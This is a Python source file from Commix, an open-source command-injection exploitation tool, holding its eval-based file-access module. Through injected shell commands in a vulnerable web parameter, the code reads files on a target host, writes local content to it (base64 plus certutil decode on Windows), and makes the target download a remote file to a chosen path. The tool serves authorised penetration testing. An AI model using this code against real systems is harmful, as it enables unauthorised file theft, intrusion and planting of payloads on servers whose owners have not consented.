#!/usr/bin/env python
# encoding: UTF-8

"""
This file is part of Commix Project (http://commixproject.com).
Copyright (c) 2014-2017 Anastasios Stasinopoulos (@ancst).

This program is free software: you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation, either version 3 of the License, or
(at your option) any later version.
 
For more see the file 'readme/COPYING' for copying permission.
"""
import re
import os
import sys
import urllib
import urllib2

from src.utils import menu
from src.utils import settings
from src.utils import session_handler

from src.thirdparty.colorama import Fore, Back, Style, init

from src.core.requests import requests
from src.core.injections.results_based.techniques.eval_based import eb_injector

"""
 The dynamic code evaluation (aka eval-based) technique.
"""

"""
Read a file from the target host.
"""
def file_read(separator, TAG, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, alter_shell, filename, timesec):
  file_to_read = menu.options.file_read
  # Execute command
  if settings.TARGET_OS == "win":
    cmd = settings.WIN_FILE_READ + file_to_read
  else:
    cmd = "(" + settings.FILE_READ + file_to_read + ")"
  if session_handler.export_stored_cmd(url, cmd, vuln_parameter) == None or menu.options.ignore_session:
    # Command execution results.
    response = eb_injector.injection(separator, TAG, cmd, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, alter_shell, filename)
    # Perform target page reload (if it is required).
    if settings.URL_RELOAD:
      response = requests.url_reload(url, timesec)
    # Evaluate injection results.
    shell = eb_injector.injection_results(response, TAG, cmd)
    shell = "".join(str(p) for p in shell)
    session_handler.store_cmd(url, cmd, shell, vuln_parameter)
  else:
    shell = session_handler.export_stored_cmd(url, cmd, vuln_parameter)
  if settings.VERBOSITY_LEVEL >= 1 and menu.options.ignore_session:
    print ""
  if shell:
    success_msg = "The contents of file '"  
    success_msg += file_to_read + "'" + Style.RESET_ALL + ": "
    sys.stdout.write(settings.print_success_msg(success_msg))
    sys.stdout.flush()
    print shell
    output_file = open(filename, "a")
    success_msg = "The contents of file '"
    success_msg += file_to_read + "' : " + shell + ".\n"
    output_file.write(re.compile(re.compile(settings.ANSI_COLOR_REMOVAL)).sub("",settings.SUCCESS_SIGN) + success_msg)
    output_file.close()
  else:
    warn_msg = "It seems that you don't have permissions "
    warn_msg += "to read the '" + file_to_read + "' file."
    sys.stdout.write(settings.print_warning_msg(warn_msg) + "\n")
    sys.stdout.flush()
   
"""
Write to a file on the target host.
"""
def file_write(separator, TAG, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, alter_shell, filename, timesec):
  file_to_write = menu.options.file_write
  if not os.path.exists(file_to_write):
    warn_msg = "It seems that the '" + file_to_write + "' file, does not exists."
    sys.stdout.write(settings.print_warning_msg(warn_msg) + "\n")
    sys.stdout.flush()
    sys.exit(0)
    
  if os.path.isfile(file_to_write):
    with open(file_to_write, 'r') as content_file:
      content = [line.replace("\r\n", "\n").replace("\r", "\n").replace("\n", " ") for line in content_file]
    content = "".join(str(p) for p in content).replace("'", "\"")
    if settings.TARGET_OS == "win":
      import base64
      content = base64.b64encode(content)
  else:
    warn_msg = "It seems that '" + file_to_write + "' is not a file."
    sys.stdout.write(settings.print_warning_msg(warn_msg) + "\n")
    sys.stdout.flush()
    
  if os.path.split(menu.options.file_dest)[1] == "" :
    dest_to_write = os.path.split(menu.options.file_dest)[0] + "/" + os.path.split(menu.options.file_write)[1]
  elif os.path.split(menu.options.file_dest)[0] == "/":
    dest_to_write = "/" + os.path.split(menu.options.file_dest)[1] + "/" + os.path.split(menu.options.file_write)[1]
  else:
    dest_to_write = menu.options.file_dest

  # Execute command
  if settings.TARGET_OS == "win":
    dest_to_write = dest_to_write.replace("\\","/")
    # Find path
    path = os.path.dirname(dest_to_write)
    path = path.replace("/","\\")
    # Chnage directory
    cmd = "cd " + path
    response = eb_injector.injection(separator, TAG, cmd, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, alter_shell, filename)
    # Find filename
    filname = os.path.basename(dest_to_write)
    tmp_filname = "tmp_" + filname
    cmd = settings.FILE_WRITE + " " + content + ">" + tmp_filname
    response = eb_injector.injection(separator, TAG, cmd, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, alter_shell, filename)
    # Decode base 64 encoding
    cmd = "certutil -decode "  + tmp_filname + " " + filname
    response = eb_injector.injection(separator, TAG, cmd, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, alter_shell, filename)  
    eb_injector.injection_results(response, TAG, cmd)
    # Delete tmp file
    cmd = "del "  + tmp_filname 
    response = eb_injector.injection(separator, TAG, cmd, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, alter_shell, filename)  
    eb_injector.injection_results(response, TAG, cmd)
    # Check if file exists
    cmd = "if exist " + filname + " (echo " + filname + ")"
    dest_to_write = path + "\\" + filname

  else:
    cmd = settings.FILE_WRITE + " '" + content + "'" + ">" + "'" + dest_to_write + "'"
    response = eb_injector.injection(separator, TAG, cmd, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, alter_shell, filename)
    shell = eb_injector.injection_results(response, TAG, cmd)
    shell = "".join(str(p) for p in shell)
    # Check if file exists
    cmd = "echo $(ls " + dest_to_write + ")"

  # Check if defined cookie injection.
  response = eb_injector.injection(separator, TAG, cmd, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, alter_shell, filename)
  shell = eb_injector.injection_results(response, TAG, cmd)
  shell = "".join(str(p) for p in shell)
  if shell:
    if settings.VERBOSITY_LEVEL >= 1:
      print ""
    success_msg = "The " +  shell + Style.RESET_ALL
    success_msg += Style.BRIGHT + " file was created successfully!" + "\n" 
    sys.stdout.write(settings.print_success_msg(success_msg))
    sys.stdout.flush()
  else:
    if settings.VERBOSITY_LEVEL >= 1:
      print ""
    warn_msg = "It seems that you don't have permissions to write the '" + dest_to_write + "' file." 
    sys.stdout.write(settings.print_warning_msg(warn_msg) + "\n")
    sys.stdout.flush()


"""
Upload a file on the target host.
"""
def file_upload(separator, TAG, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, alter_shell, filename, timesec):
  if settings.TARGET_OS == "win":
    # Not yet implemented
    pass
  else:
    file_to_upload = menu.options.file_upload
    # check if remote file exists.
    try:
      urllib2.urlopen(file_to_upload)
    except urllib2.HTTPError, err_msg:
      warn_msg = "It seems that the '" + file_to_upload + "' file, does not exists. (" +str(err_msg)+ ")"
      sys.stdout.write(settings.print_warning_msg(warn_msg) + "\n")
      sys.stdout.flush()
      sys.exit(0)
      
    # Check the file-destination
    if os.path.split(menu.options.file_dest)[1] == "" :
      dest_to_upload = os.path.split(menu.options.file_dest)[0] + "/" + os.path.split(menu.options.file_upload)[1]
    elif os.path.split(menu.options.file_dest)[0] == "/":
      dest_to_upload = "/" + os.path.split(menu.options.file_dest)[1] + "/" + os.path.split(menu.options.file_upload)[1]
    else:
      dest_to_upload = menu.options.file_dest
      
    # Execute command
    cmd = settings.FILE_UPLOAD + file_to_upload + " -O " + dest_to_upload 
    response = eb_injector.injection(separator, TAG, cmd, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, alter_shell, filename)
    shell = eb_injector.injection_results(response, TAG, cmd)
    shell = "".join(str(p) for p in shell)
    
    # Check if file exists!
    if settings.TARGET_OS == "win":
      cmd = "dir " + dest_to_upload + ")"
    else:  
      cmd = "echo $(ls " + dest_to_upload + ")"
    response = eb_injector.injection(separator, TAG, cmd, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, alter_shell, filename)
    shell = eb_injector.injection_results(response, TAG, cmd)
    shell = "".join(str(p) for p in shell)
    if settings.VERBOSITY_LEVEL >= 1:
      print ""
    if shell:
      success_msg = "The " +  shell
      success_msg += Style.RESET_ALL + Style.BRIGHT + " file was uploaded successfully!" 
      sys.stdout.write(settings.print_success_msg(success_msg) + "\n")
      sys.stdout.flush()
    else:
      warn_msg = "It seems that you don't have permissions to write the '" + dest_to_upload + "' file."
      sys.stdout.write(settings.print_warning_msg(warn_msg) + "\n")
      sys.stdout.flush()

"""
Check the defined options
"""
def do_check(separator, TAG, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, alter_shell, filename, timesec):

  if menu.options.file_write:
    file_write(separator, TAG, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, alter_shell, filename, timesec)
    settings.FILE_ACCESS_DONE = True

  if menu.options.file_upload:
    file_upload(separator, TAG, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, alter_shell, filename, timesec)
    settings.FILE_ACCESS_DONE = True

  if menu.options.file_read:
    file_read(separator, TAG, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, alter_shell, filename, timesec)
    settings.FILE_ACCESS_DONE = True 

# eof